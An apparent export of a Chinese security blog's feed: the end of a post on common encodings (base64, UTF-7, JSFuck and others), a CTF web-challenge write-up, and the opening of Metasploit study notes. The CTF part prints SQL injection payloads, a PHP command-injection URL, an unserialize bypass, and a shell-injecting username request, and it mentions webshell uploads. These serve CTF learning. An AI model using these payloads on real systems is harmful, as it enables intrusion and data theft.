%编码,其编码方式非常简单，只需要使用US-ASCII将字符转化为十六进制字符并加一个%即可。<br>要注意URL编码采用的是ASCII而不是Unicode，所以url内不能存在中文。<br>如下是js三个函数的url编码规则：即不对一下字符进行编码。</p><p>escape（69个）：<em>/@+-._0-9a-zA-Z<br>encodeURI（82个）：!#$&amp;'()</em>+,/:;=?@-.<em>~0-9a-zA-Z<br>encodeURIComponent（71个）：!'()*-.</em>~0-9a-zA-Z</p><h3 id="font-color-LightSkyBlue-Html编码-font-br"><font color = "LightSkyBlue">Html编码</font><br></h3><p><b>定义</b><br>同url一样，html编码也是为了防止歧义。</p><p><b>编码方式</b><br>其实常用的只是过滤了几个关键的字符，其他的依旧是十六进制的表示ASCII码的方法。</p><table><thead><tr><th>字符</th><th>十进制</th><th>十六进制数字</th><th>转义字符</th></tr></thead><tbody><tr><td>&quot;</td><td><code>&amp;#34;</code></td><td><code>&amp;#x22; </code></td><td><code>&amp;quot;</code></td></tr><tr><td>&amp;</td><td><code>&amp;#38;</code></td><td><code>&amp;#x26;</code></td><td><code>&amp;amp;</code></td></tr><tr><td>&lt;</td><td><code>&amp;#60;</code></td><td><code>&amp;#x3C;</code></td><td><code>&amp;lt;</code></td></tr><tr><td>&gt;</td><td><code>&amp;#62;</code></td><td><code>&amp;#x3E;</code></td><td><code>&amp;gt;</code></td></tr><tr><td>不断开空格</td><td><code>&amp;#160;</code></td><td><code>&amp;#xA0;</code></td><td><code>&amp;nbsp;</code></td></tr></tbody></table><p><b><font color="red">注意不能丢掉分号！</font></b></p><h2 id="b-id-0x02-0x02-base-b"><b id=0x02>0x02- - base</b></h2><p>吃过最多次亏的一个编码，最早认为后面有两个==的就是base64...而且只知道一个base64...<br><a href="https://www.qqxiuzi.cn/bianma/base.php?type=16">base全家福</a></p><h3 id="font-color-LightSkyBlue-base64-font-br"><font color = "LightSkyBlue">base64</font><br></h3><p><b>定义</b></p><p>Base64是网络上最常见的用于传输<font color = "red">8Bit字节码的编码</font>方式之一，Base64就是一种基于64个可打印字符来表示二进制数据的方法。可查看RFC2045～RFC2049，上面有MIME的详细规范。</p><p>Base64编码是从二进制到字符的过程，可用于在HTTP环境下传递较长的标识信息。例如，在Java Persistence系统Hibernate中，就采用了Base64来将一个较长的唯一标识符（一般为128-bit的UUID）编码为一个字符串，用作HTTP表单和HTTP GET URL中的参数。在其他应用程序中，也常常需要把二进制数据编码为适合放在URL（包括隐藏表单域）中的形式。此时，采用Base64编码具有不可读性，需要解码后才能阅读。(来源于百度百科)</p><p>由于某些系统中只能使用ASCII字符。Base64就是用来将非ASCII字符的数据转换成ASCII字符的一种方法。</p><p>base64特别适合在http，mime协议下快速传输数据。</p><p><b>编码方式</b></p><p><img src="https://blog.dvkunion.cn/img/006IjVYfgy1fyfwmuac6lj30hv0dg74g.jpg" alt=""></p><p>如图可见，base64用64个可以打印的ASCII字符来转换任意的二进制,2^6=64,所以base64以6位一分割，且分割的之前的二进制应该为24的倍数（6、8的最小公倍数），不足的位数用base通用补码'='补齐。</p><p>举个例子会更好理解：<br><img src="https://blog.dvkunion.cn/img/006IjVYfgy1fyfw58qtsrj30iz04ht8l.jpg" alt=""></p><p>当位数不足时候，先用0把前面的凑出一个6位，再用'='可以补出24的倍数即可。所以，可以总结出：</p><p><b><font color = "red">在Base64中4个字符为一个块，对应铭文中的三个字符。因此Base64编码后会比原文本多出1/3左右</font></b></p><p>因此我们可以轻松的依此计算：DVKD----&gt;RFZLRA==；DVKDV----&gt;RFZLRFY=；DVKDVK----&gt;RFZLRFZL</p><h3 id="font-color-LightSkyBlue-base32-font-br"><font color = "LightSkyBlue">base32</font><br></h3><p><b>定义</b></p><p>Base32看名字就知道和64不会相差很多，只是用32个字符来进行编码。2^5=32,所以5位一分割，公倍数40(5,8)。所以必须是40倍数。</p><p><b>编码方式</b></p><p><img src="https://blog.dvkunion.cn/img/006IjVYfgy1fyfwmt5r59j30fi0dimx6.jpg" alt=""></p><p><img src="https://blog.dvkunion.cn/img/006IjVYfgy1fyfxbvaiwsj30qg04lwef.jpg" alt=""></p><p>明文五个字符---&gt;转码八个字符。</p><h3 id="font-color-LightSkyBlue-base16-font-br"><font color = "LightSkyBlue">base16</font><br></h3><p><b>定义</b></p><p>Base家族也就这样了，大同小异。16个字符，2^4=16,4位一分割，公倍数8(4,8)。8的倍数即可。</p><p><b>编码方式</b></p><p><img src="https://blog.dvkunion.cn/img/006IjVYfgy1fyfwrl8o1pj30fl0bja9y.jpg" alt=""></p><p><img src="https://blog.dvkunion.cn/img/006IjVYfgy1fyfxj1io0tj30ix04g746.jpg" alt=""></p><blockquote><p><b>总结</b></p><ul><li>1.base64中包含大写字母、小写字母、数字1~9以及特殊字符'+'和'/'</li><li>2.base64为6bit一转换，所以编码后通常比明文多1/3</li><li>3.base64常用于传输，注意是传输，如UTF-8编码的中文，可以通过Base64进行良好的传输。</li><li>4.base32中只包含大写字母、数字2~7</li><li>5.base32为5bit一转换,由于其编码不包含'',其结果可以用作文件名。</li><li>6.base32比base64多出 20% 左右的大小，通常比明文多3/5</li><li>7.base16中只包含数字0~9以及大写字母'A'~'F'</li><li>8.base16为4bit一转换，所以编码结果准确的为明文的一倍，且不存在填充用的'='</li></ul></blockquote><h3 id="font-color-LightSkyBlue-UTF-7-font-br"><font color = "LightSkyBlue">UTF-7</font><br></h3><p><b>定义</b><br>UTF-7 是base64的修改版，主要目的是为了将UTF-16的数据用Base64的方法进行编码传输。</p><p><b>编码方式</b><br>UTF-7编码的规则为：</p><p>1&gt; UTF16小于等于 0x7F 的字符，采用ASCII编码；<br>2&gt; UTF16大于0x7F的字符，采用Base64编码，然后在首尾分别加上+-；<br>3&gt; UTF-7编码后，所有字符均小于等于 0x7F。</p><p><a href="http://toolswebtop.com/text/process/decode/UTF-7">UTF-7在线工具</a></p><h3 id="font-color-LightSkyBlue-Quoted-printable-font-br"><font color = "LightSkyBlue">Quoted-printable</font><br></h3><p><b>定义</b><br>同base64一样，Quoted-printable也是用于满足将非ASCII码转化为ASCII码。可译为“可打印字符引用编码”、“使用可打印字符的编码”。当非ASCII字符较少时，Quoted-printable有着较好的可读性。</p><p><b>编码方式</b></p><p>Quoted-printable编码规则为：将任意一个8 bit 表示为：一个'='和两个十六进制字符。</p><p><a href="https://www.w3cschool.cn/tools/index?name=decode_encode_tool">Quoted-printable在线工具</a></p><h3 id="font-color-LightSkyBlue-uuencode-uudecode-font-br"><font color = "LightSkyBlue">uuencode/uudecode</font><br></h3><p><b>定义</b></p><p>uuencode这个名字是衍生自&quot;Unix-to-Unix encoding&quot;，原先是Unix系统下将二进制的资料借由uucp邮件系统传输的一个编码程式，是一种二进制到文字的编码。</p><p><b>加密方式</b><br>uuencode编码序列：从ascii码的32位算为uudecode的0位。<br>uuencode只是格式复杂。其编码同base64一样，只是每一组都要加32。</p><p>例如：cat 加密后-&gt; #8V%T<br>begin 644 为uudecode标识。</p><p><code>begin 644 cat.txt</code><br><code>#8V%T</code><br>`<br><code>end</code></p><h3 id="font-color-LightSkyBlue-XXencode-font-br"><font color = "LightSkyBlue">XXencode</font><br></h3><p><b>定义</b></p><p>Xxencode是一种类似于uuencode的一种二进制到文字的编码，它只使用字母数字字符，以及加号和减号。也是一种用于传输文件的编码格式。</p><p><b>编码方式</b><br>xxencode编码序列: '+-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'<br>uuencode不去减32直接转化为xxencode码就是xxencode</p><p><a href="http://web.chacuo.net/charsetxxencode">uuencode &amp;&amp; xxencode 工具</a></p><h2 id="b-id-0x03-0x03-JS-b"><b id=0x03>0x03- - JS</b></h2><p>在url中提到，js对url有三种编码函数，其不编码的字符分别如下：<br>escape（69个）：<em>/@+-._0-9a-zA-Z<br>encodeURI（82个）：!#$&amp;'()</em>+,/:;=?@-.<em>~0-9a-zA-Z<br>encodeURIComponent（71个）：!'()*-.</em>~0-9a-zA-Z</p><p>同时js还有着几种特殊的编码</p><h3 id="font-color-LightSkyBlue-Aencode-font-br"><font color = "LightSkyBlue">Aencode</font><br></h3><p>一种将js编码转化为颜文字的编码格式<br><a href="https://www.sojson.com/aaencode.html">AAencode在线工具-1</a><br><a href="https://tool.zcmzcm.org/aadecode">AAdecode在线工具-2</a></p><h3 id="font-color-LightSkyBlue-JJencode-font-br"><font color = "LightSkyBlue">JJencode</font><br></h3><p>一种将js编码转化为非正常编码的格式<br><a href="https://www.sojson.com/jjencode.html">JJencode在线工具</a></p><h3 id="font-color-LightSkyBlue-JSfuck-font-br"><font color = "LightSkyBlue">JSfuck</font><br></h3><p>一种将js编码转化为![]等符号的编码格式。<br><a href="http://utf-8.jp/public/jsfuck.html">jsfuck在线工具</a></p><p>基本js的加密都是不可逆的，所以只能在控制台观察一下运行结果。</p><h3 id="font-color-LightSkyBlue-社会主义核心价值观编码-font-br"><font color = "LightSkyBlue">社会主义核心价值观编码</font><br></h3><p>...这个第一次见到时候也是挺无语的...<br><a href="https://github.com/sym233/core-values-encoder">js源码开放</a><br><a href="https://sym233.github.io/core-values-encoder/">在线工具-1</a><br><a href="https://atool.vip/morse">在线工具-2</a> (这个很强大)</p><h2 id="b-id-0x04-0x04-Others-b"><b id= 0x04>0x04- - Others</b></h2><h3 id="font-color-LightSkyBlue-Morse-code-font-br"><font color = "LightSkyBlue">Morse code</font><br></h3><p>这个就已经很古老了.....直接对应表查表就好了。<br>有些地方把这个算作密码......我觉得还是莫尔斯还是一种编码的性质，作为信息的传输作用，并没有隐藏信息的功能。</p><p>莫尔斯电码表：<br><a href="https://imgchr.com/i/k69H4e"><img src="https://blog.dvkunion.cn/img/k69H4e.md.jpg" alt="k69H4e.md.jpg"></a></p><p><a href="http://www.atool.org/morse.php">在线文字转莫尔斯电码工具</a></p><h4 id="参考链接">参考链接</h4><blockquote><p>0.![kyH7t0.md.jpg : <a href="https://blog.dvkunion.cn/img/kyH7t0.md.jpg">https://blog.dvkunion.cn/img/kyH7t0.md.jpg</a>]<br>1.Unicode在线转换工具 : <a href="http://www.bejson.com/convert/unicode_chinese/">http://www.bejson.com/convert/unicode_chinese/</a><br>2.base全家福 : <a href="https://www.qqxiuzi.cn/bianma/base.php?type=16">https://www.qqxiuzi.cn/bianma/base.php?type=16</a><br>9.UTF-7在线工具 : <a href="http://toolswebtop.com/text/process/decode/UTF-7">http://toolswebtop.com/text/process/decode/UTF-7</a><br>10.Quoted-printable在线工具 : <a href="https://www.w3cschool.cn/tools/index?name=decode_encode_tool">https://www.w3cschool.cn/tools/index?name=decode_encode_tool</a><br>11.uuencode &amp;&amp; xxencode 工具 : <a href="http://web.chacuo.net/charsetxxencode">http://web.chacuo.net/charsetxxencode</a><br>12.AAencode在线工具-1 : <a href="https://www.sojson.com/aaencode.html">https://www.sojson.com/aaencode.html</a><br>13.AAdecode在线工具-2 : <a href="https://tool.zcmzcm.org/aadecode">https://tool.zcmzcm.org/aadecode</a><br>14.JJencode在线工具 : <a href="https://www.sojson.com/jjencode.html">https://www.sojson.com/jjencode.html</a><br>15.jsfuck在线工具 : <a href="http://utf-8.jp/public/jsfuck.html">http://utf-8.jp/public/jsfuck.html</a><br>16.js源码开放 : <a href="https://github.com/sym233/core-values-encoder">https://github.com/sym233/core-values-encoder</a><br>17.在线工具-1 : <a href="https://sym233.github.io/core-values-encoder/">https://sym233.github.io/core-values-encoder/</a><br>18.在线工具-2 : <a href="https://atool.vip/morse">https://atool.vip/morse</a><br>19.![k69H4e.md.jpg : <a href="https://blog.dvkunion.cn/img/k69H4e.md.jpg">https://blog.dvkunion.cn/img/k69H4e.md.jpg</a>]<br>20.在线文字转莫尔斯电码工具 : <a href="http://www.atool.org/morse.php">http://www.atool.org/morse.php</a></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h1&gt;再也没有看不懂的编码！&lt;/h1&gt;
&lt;p&gt;&lt;i&gt;2018-12-22&lt;/i&gt;&lt;/p&gt;
&lt;!-- split --&gt;
&lt;p&gt;这一阵子做的比赛突然感觉，自己基础真的是太差了。月赛的base32码硬生生以为是base64，这才反应过来看到编码就直接扔一波工具解码碰大运，错了乱码就解不开了。其实对于编码的内容和性质、一般的形式等等跟不讲不出什么所以然来。吃了这次的亏以后，决定重新一点一点一步一步的从最基本的东西开始积累，不要在急着做一些表面的东西。&lt;/p&gt;</summary>
    
    
    
    <category term="Crypto" scheme="http://blog.dvkunion.cn/categories/Crypto/"/>
    
    
    <category term="常用编码" scheme="http://blog.dvkunion.cn/tags/%E5%B8%B8%E7%94%A8%E7%BC%96%E7%A0%81/"/>
    
    <category term="密码学" scheme="http://blog.dvkunion.cn/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>XCTF - 部分WP</title>
    <link href="http://blog.dvkunion.cn/2019/02/16/XCTF/"/>
    <id>http://blog.dvkunion.cn/2019/02/16/XCTF/</id>
    <published>2019-02-16T19:41:43.000Z</published>
    <updated>2024-03-18T17:47:44.439Z</updated>
    
    <content type="html"><![CDATA[<h1>XCTF</h1><h3 id="b-0x00-前言-b"><b>0x00- - 前言</b></h3><p>找到这个地方也是几经周折...发现自己错过了Hgame...然后不甘心的一顿搜索，结果撞到这个地方。<br>不说了，刷起。</p><h3 id="b-0x01-Web-b"><b>0x01- - Web</b></h3><h4 id="font-color-blue-level-1-新手练习-font-br"><font color = "blue">level.1--新手练习</font><br></h4><p><b>01-view_source</b></p><p>题目提示使用view_source来查看源码。直接查看即可得到flag。<br>F12效果相同</p><p><b>02-get_post</b></p><p>第一步提示get发送一个a=1<br>第二步提示post发送一个b=2<br>hackbar发送得到flag。</p><p><b>03-robots</b></p><p>Robots协议，联想到robots.txt<br>查看robots.txt得到hint:flag_1s_h3re.php，访问得到flag。</p><p><b>04-backup</b></p><p>打开页面得到提示：你知道index.php的备份文件名吗？<br>备份文件名为index.php.bak,下载保存，查看源码得到flag。</p><p><b>05-cookie</b></p><p>题目提示很到位，直接查看请求包cookie得到hint:cookie.php。<br>访问得到下一个hint：http_response。<br>查看响应包得到flag。</p><p><b>06-disabled_button</b></p><p>前端问题，F12修改前端代码之后点击即可。<br>也可以直接构造请求包。</p><p><b>07-simple_js</b></p><p>js问题，访问之后是一个js窗要求输入密码<br>查看源码，观察js代码。<br>可以写出解密python脚本：<br>对实际password直接输出得到ascii码值，输出其ascii码即是Flag。</p><p><b>08-xff_referer</b></p><p>提示伪造xff和referer。<br>伪造即可得到flag。<br>浏览器修改的话回音藏到后面，F12查看源码。</p><p><b>09-weak_auth</b></p><p>尝试登陆，提示密码错误，你可能需要一个字典。<br>弱密码爆破得到flag。<br>这里看教程拿到了一个字典库：<br><a href="https://github.com/rootphantomer/Blasting_dictionary">字典</a></p><p><b>010-webshell</b></p><p>一句话木马，菜刀连一下。<br>直接看到flag.txt。得到flag</p><p><b>011-command_execution</b></p><p>命令注入，相当于DVWA的Low level。<br>cat /home flag.txt</p><p><b>012-simple_php</b></p><p>阅读php代码按要求输入即可...<br>a:科学计数法绕过。<br>b:%00截断。</p><h4 id="font-color-blue-level-2-萌新入坑-font-br"><font color = "blue">level.2--萌新入坑</font><br></h4><p><b>01-upload</b></p><p>打开是一个文件上传窗，随便上传一个发现回显路径;访问路径成功。<br>尝试上传一句话木马：提示只能上传jpg，但是文件栏成功显示一句话木马文件，只是上传按钮变灰。<br>联想到了是前端的过滤，禁用JS进行尝试。<br>成功上传一句话木马，菜刀连接。得到flag。</p><p><b>02-NewsCenter</b></p><p>发现存在post注入点。<br>手动注入：<br><code>1' order by 3# </code> 存在3列</p><p><code>1' union select 1,2,3</code> 查看回显位置</p><p><code>1' union select 1,2,group_concat(SCHEMA_NAME) from information_schema.SCHEMATA#</code>或者<code>1' union select 1,2,schema_name from information_schema.schemata#</code>查看存在哪些数据库。</p><p><code>1' union select 1,2,user()#</code>查看用户。</p><p><code>1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='news'#</code>查看new内有哪些表单。</p><p><code>1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='secret_table'#</code>查看sercet_table下的列名。</p><p><code>1' union select 1,2,fl4g from secret_table#</code>查询数据得到flag。</p><blockquote><p>自己手动注入那叫一个差劲啊</p></blockquote><p><b>03-Training-Get-Resourced</b></p><p>题目描述不让看注释，就去看看注释<br>啊，有了...(这难度星级是随便打的嘛...)</p><p><b>04-Triangle</b></p><p>没有任何提示，先打开看看。<br>一个要求输入Flag的页面。<br>看到了后面的js脚本。。。<br>ok，不会，看题解了。<br>这是一道JS逆向题...<br>console可以看到关键的三个函数。。。<br>题目解释说是unicorn.js的一个ARM仿真加密，需要IDE逆向...</p><p><b>05-mfw</b></p><p>首先发现了注释：my secret，而url仿佛存在任意文件访问漏洞。然而尝试后发现会有detect保护。<br>继续查看剩下的页面，发现组成部分中包含：GIT<br>难道是git泄露？<br>ok,发现.git文件目录。学习了gitTools使用方法，下载到了源码。<br>看到index.php内存在一个这样的语句</p><p><code>$file = &quot;templates/&quot; . $page . &quot;.php&quot;;</code></p><p>这里存在着任意命令执行漏洞。</p><p>构造<code>111.198.29.45:31701/index.php?page=%27.system(&quot;cd%20../../../;%20ls%20-lA;&quot;).%27about</code></p><p>这里大神还给出了一个小技巧，使用view-source可以格式化查看结果。<br>查看flag.php，得到flag<br>这里我完全是瞎猫碰死耗子。。。大佬解释了为什么.git内不存在flag内容而通过上述操作的就存在答案。因为对git的命令和原理根本不熟悉。</p><p>大佬重审了git下载的库,发现主机内的flag.php文件被修改，但是还没有提交，使用<code>git diff</code>命令进行对比，得到了flag...</p><blockquote><p>follow the master,（跟随大师，）</p><p>and walk with the master,（与大师通行，）</p><p>新增支线任务：学习git</p></blockquote><p><b>06-ics-06</b></p><p>以为又是注入...结果发现根本不是一个注入点。<br>后来想了想题面提示，只有一个。<br>...不会让我爆破id把。。。<br>然后测了一下id=9999999都不报错....<br>行吧，爆破下把。<br>OK,2333<br>的确是送分题，感觉很恶心。。。（如果我爆破只跑了2222怎么办？）</p><p><b>07-upload</b></p><p>看题目意思应该是一个上传题目。<br>测试一下，发现只能够上传jpg图片文件。<br>行吧，卡住了，找大佬去了。<br>然后说这是一个注入题。。。文件名的二次注入(这谁扛得住啊...)<br>先去默默地了解下二次注入...(sqliab)<br>二次注入的思路是先将脏数据存入到数据库中，再取出的过程中完成对Sql语句的污染。<br>。。。二次注入的大佬思路没看懂...这里使用了另一个大佬的盲注,通过insert注入回显。：</p><p><code>1' &amp; (( seleselectct count(table_name) frfromom information_schema.tables where table_schema=database())=1)&amp; '1.jpg&quot;</code></p><p>获取表的数量</p><p><code>filename=&quot;1' &amp; (sselectelect (seselectlect length(table_name) frofromm information_schema.tables where table_schema=database() limit 0,1)&gt;8)&amp; '1.jpg&quot;</code></p><p>获取表的长度</p><p><code>filename=&quot;1' &amp; (ascii(substr((selselectect table_name frfromom information_schema.tables where table_schema=database() limit 0,1) ,1,1)) &gt; 100 )&amp; '1.jpg&quot;</code></p><p>获取表的名称</p><p>的确是一个可行的方案，但是这个原题目应该有验证码的，所以盲注需要时间太长了。<br>再看大佬的大佬的注入方法：</p><p><code>‘+concat((selselectect version()))+’.jpg</code></p><p>查看mysql 版本，返回 5.6</p><p><code>‘+concat((selselectect length(database())))+’.jpg </code></p><p>查看database长度 返回 10</p><p><code>‘+concat((selselectect ascii(substr(database(),1,1))))+’.jpg</code></p><p>查看Database名字 返回 119 以此繼續爆..</p><p><code>‘+concat((selselectect ascii(substr((selselectect table_name frfromom  information_schema.tables where table_schema=database() limit  0,1),1,1))))+’.jpg</code></p><p>爆第一个表名 返回 102 以此繼續爆..到第5位</p><p><code>‘+concat((selselectect ascii(substr((selselectect table_name frfromom  information_schema.tables where table_schema=database() limit  1,1),1,1))))+’.jpg</code></p><p>爆第二个表名 返回 104 以此繼續爆..到第18位</p><p><code>‘+concat((selselectect ascii(substr((selselectect column_name frfromom information_schema.columns where table_name=’hello_flag_is_here’ limit 0,1),1,1))))+’.jpg</code></p><p>爆列名字 返回 105</p><p>以此繼續爆..到第10位</p><p><code>‘+concat((selselectect ascii(substr((selselectect i_am_flag frfromom  hello_flag_is_here LIMIT 0,1),1,1))))+’.jpg </code></p><p>爆数据 返回 33 以此繼續爆..到第16位</p><p>跟着这个大佬的思路，总算是做出来了。。。要改一个地方，这个题目过滤了ascii，所以我用了hex来转成16进制输出.</p><p>再遇坑点：hex输出时候会吞掉字符只输出数字。</p><p>这里感觉对concat的理解还不到位。</p><p>再次换方法：放弃concat 使用 conv 对hex 转换成二进制。</p><p>一位一位的读出来。得到flag</p><blockquote><p>好好练习sql注入</p></blockquote><p><b>08-biscuiti-300</b></p><p>打开发现一个简单的username 和password的登录窗</p><p>一个post方法的登录。</p><p>尝试注入,但是不管结果是啥返回只有一个error...</p><p>扔去暴力破解吧...</p><p>ok直接炸出来0的时候admin登陆成功...然并卵啊。</p><p>行吧，那就继续研究注入吧。</p><p>又是没见过的注入：</p><p><code>'union select '123','456'--&amp;password=0 </code><br>可以用任意用注入。</p><p>查看cookie 发现一个base64加密的序列化。</p><p>需要将is admin置为1。</p><p>这里提到了CBC字节反转攻击...padding oracle</p><p><b>09-unserialize3</b><br>题目是一段php，给了一个class，要求用code传输反序列化的字符串。<br>构造了一个反序列化提交：O:4:&quot;xctf&quot;:1:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}，返回bad request。<br>这里由于class内有__wakeup()函数导致在反序列化时会运行这个函数。<br>于是题目转变成了魔术函数的绕过：这是一个CVE，漏洞编号CVE-2016-7124<br>当成员属性数目大于实际数目时可绕过__wakeup()。<br>修改poc,得到flag。<br><code>O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p><p><b>10-wtf.sh-150</b></p><p>连接是一个带有注册和登录的论坛界面。<br>一开始以为是注入...对着测试了一通。。<br>还是跟着大佬的脚步把、、、<br>不得不说大佬是真的强：对于注册窗口用户名存xss漏洞都能挖出来...<br>首先这题存在着源码泄露：wtf.sh可以直接查看源码<br>查看源码时可以发现存在LFI漏洞，我们需要以管理员身份登陆，并且登录的token 和password在/users目录下<br>尝试使用LFI漏洞进行访问：../users<br>得到了众多用户的md5 密文和base64的token<br>修改cookie和token F5刷新可以看到，我们已经是管理员登录了，在管理page页面内得到了...半句flag(wtf??)<br>行吧，这种题目水平已经不是我能够做的了，老实的跟着大佬做吧...<br>继续查看源码...会发现在reply中包含一个可以写入文件的参数、<br>首先注册用户名为 ${find,/,-iname,get_flag2} 的用户，并以该用户进行提交<br><code>POST /reply.wtf?post=../users_lookup/sh.wtf%09 HTTP/1.1 Host: web.chal.csaw.io:8001 Content-Type: application/x-www-form-urlencoded Cookie: USERNAME=$&#123;find,/,-iname,get_flag2&#125;; TOKEN=Uf7xrOWHXoRzLdVS6drbhjHyIZVsCXFgQYnOG01UhENS1aaajeezaWrgpOno8HBljrHOMmfbQUY+rES1bWlNWQ== text=asd&amp;submit=</code><br>之后访问我们提交的页面/users_lookup/sh.wtf<br>可以得到flag2的访问路径。<br>由此，我们重新构造请求访问Flag2即可。</p><p><b>11-Training-WWW-Robots</b></p><p>题目提示 robots.txt，是一个 robots 泄露。访问提示：/fl0g.php，访问得到flag<br>。。。题目难度差距有点大。</p><p><b>12-PHP2</b></p><p>有个坑点。。。原题好像有提示说index.phps有源码...<br>打开查看源码,发现是一个二次url加密绕过...对admin二次加密即可...</p><p><b>13-lottery</b></p><p>这个源码给的就很舒服了，直接就在附件中，先看源码吧。</p><p><b>14-FlatScience</b></p><p>robots.txt给了两个页面的提示，访问login.php存在注释：debug参数<br>GET debug参数可以查看源码，发现存在注入点。<br>注入得到cookie提示，密码在他的论文里。<br>写个脚本跑sha1值得到密码。<br>登录即可。</p><p>注入payload:usr=' union select 1,(select id || '; ' || name || '; ' || password || '; ' || hint from Users limit 1)--&amp;pw=</p><p><b>15-ics-01</b></p><p>题目提示是一个工控系统，寻找入手点。<br>自己做的时候绕了一大阵子那个上传点，一中午之后愤怒查找题解。。。</p><p>结果还是少了几句话的提示原因。。。</p><p>首先源码泄露....不知道为什么御剑字典里没有这种类型的测试。</p><p><code>.index.php.swp</code><br><code>.index.php.swo</code><br><code>.index.php.swn</code></p><p>下载到源码swp文件，但是就是怎么都恢复不出来???<br>行吧，默认当作有源码做了。。。<br>然后发现可以使用php://input来查看upload.php的源码...</p><p><b>16-NaNNaNNaNNaN-Batman</b></p><p>好的我又开始上提还没做完就来做下一道题了。<br>这题只有一个附件，给了一个web100的源码。<br>里面大概是js代码的样子。<br>熟悉的特殊符号。。。这题好像哪里见到过的样子。但是想不起来怎么处理的了。<br>估计又是做了一半扔掉了。</p><p>OK，老规矩之后，这题学习一下chrome调试大法。<br>F12 -&gt; source 进入到开发者模式。在eval前加入断点调试。即可得到源码。。<br>正则表达式构造出密码直接得到flag.</p><p>还有好多种骚方法。。。直接代码审计，，，看出flag。<br>还有大佬把eval()换成alert()....直接弹出来。<br>dalao tql...</p><p><b>17</p><h4 id="参考链接">参考链接</h4><blockquote><p>0.字典 : <a href="https://github.com/rootphantomer/Blasting_dictionary">https://github.com/rootphantomer/Blasting_dictionary</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;XCTF&lt;/h1&gt;
&lt;h3 id=&quot;b-0x00-前言-b&quot;&gt;&lt;b&gt;0x00- - 前言&lt;/b&gt;&lt;/h3&gt;
&lt;p&gt;找到这个地方也是几经周折...发现自己错过了Hgame...然后不甘心的一顿搜索，结果撞到这个地方。&lt;br&gt;
不说了，刷起。&lt;/p&gt;
&lt;h3 id=&quot;b-0x</summary>
      
    
    
    
    <category term="CTF" scheme="http://blog.dvkunion.cn/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://blog.dvkunion.cn/tags/CTF/"/>
    
    <category term="WP" scheme="http://blog.dvkunion.cn/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>Metasploit渗透测试魔鬼训练营笔记</title>
    <link href="http://blog.dvkunion.cn/2019/01/30/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%AD%94%E9%AC%BC%E8%AE%AD%E7%BB%83%E8%90%A5%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/"/>
    <id>http://blog.dvkunion.cn/2019/01/30/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%AD%94%E9%AC%BC%E8%AE%AD%E7%BB%83%E8%90%A5%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/</id>
    <published>2019-01-30T22:30:00.000Z</published>
    <updated>2024-03-18T17:47:44.439Z</updated>
    
    <content type="html"><![CDATA[<h1>Metasploit渗透测试魔鬼训练营渗透笔记</h1><p><i>2019-1-30</i></p><p><a href="https://github.com/Urinx/Books/raw/master/metasploit/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%AD%94%E9%AC%BC%E8%AE%AD%E7%BB%83%E8%90%A5.pdf">Metasploit渗透测试魔鬼训练营渗透.pdf</a></p><!-- split --><p>日常写点什么<br>寒假开始一周多，想把这本搞了快半年的书彻底的读完。<br>写一个小总结似的笔记，把书里的课后习题和镜像练习实验都一遍。<br>也附带的写一下遇到的坑点和心得吧。<br>调整了一下结构，把每一章的小结都放到了开始部分，希望以后复习时候可以一口气回答出这些问题。</p><span id="more"></span><p><i>2019-2-13</i></p><p>读到中间部分感觉这本书还是有点年代感了，有些工具已经不再支持甚至不能够使用了，然而强迫症又想把所有的都做完...很难受。<br>后面部分可能会过的快一点...</p><hr><h2 id="b-第一章-b"><b>第一章</b></h2><p>在这一章主要是介绍 Metasploit 以及渗透测试的基本流程和名词定义。</p><p><b>第一章小结：</b></p><blockquote><p>1.什么是渗透测试?<br>2.渗透测试标准?<br>3.渗透测试流程?<br>4.渗透测试核心?<br>5.Metasploit是什么?<br>6.Metasploit发展史?<br>7.Metasploit主要6模块?<br>8.Metasploit安装和启动?</p></blockquote><p><b>什么是渗透测试?</b><br><b>渗透测试(Penetration Testing)</b>是一种模拟恶意攻击者的技术方法，对安全系统进行测试攻击，取得访问控制权，并发现安全隐患的一种安全测试与评估方法。这些渗透测试者一般称为渗透工程师。</p><p>渗透测试一般分为两种，即<b>黑盒测试</b>和<b>白盒测试</b><br>黑盒测试：设计一个对客户一无所知的渗透攻击<br>白盒测试：拥有客户组织所有知识情况下的渗透测试<br>灰盒测试：将以上两种测试方法结合的渗透测试</p><p><b>安全业界的开源测试手段：</b></p><table><thead><tr><th>名称</th><th>简写</th><th>简述</th></tr></thead><tbody><tr><td>安全测试方法开源手册</td><td>OSSTMM</td><td>提供物理安全、人类心理学、数据网络、无线通信、电讯通信五类渠道的测试用例</td></tr><tr><td>网络安全测试指南</td><td>NIST SP 800-42</td><td>美国国家标准与研究院(NIST)所讨论</td></tr><tr><td>十大web应用安全项目</td><td>OWASP TOP 10</td><td>针对高风险的web领域</td></tr><tr><td>渗透测试执行标准</td><td>PTES</td><td>广泛应用的一个执行标准：<a href="http://www.pentest-standard.org">PTES</a></td></tr></tbody></table><p><b>渗透测试过程环节：</b></p><table><thead><tr><th>id</th><th>阶段名称</th><th>英文名称</th><th>执行动作</th></tr></thead><tbody><tr><td>1</td><td>前期交互阶段</td><td>Pre-engagement Interactions</td><td>定制渗透测试的范围、目标、限制条件、服务合扩谱图同等</td></tr><tr><td>2</td><td>情报搜集阶段</td><td>Intelligence Gathering</td><td>通过信息搜集获取更大关于目标组织网络拓扑、系统配置等信息</td></tr><tr><td>3</td><td>威胁建模阶段</td><td>Threat Modeling</td><td>通过信息搜集的信息进行讨论分析最可行的攻击手段</td></tr><tr><td>4</td><td>漏洞分析阶段</td><td>Vulnerability 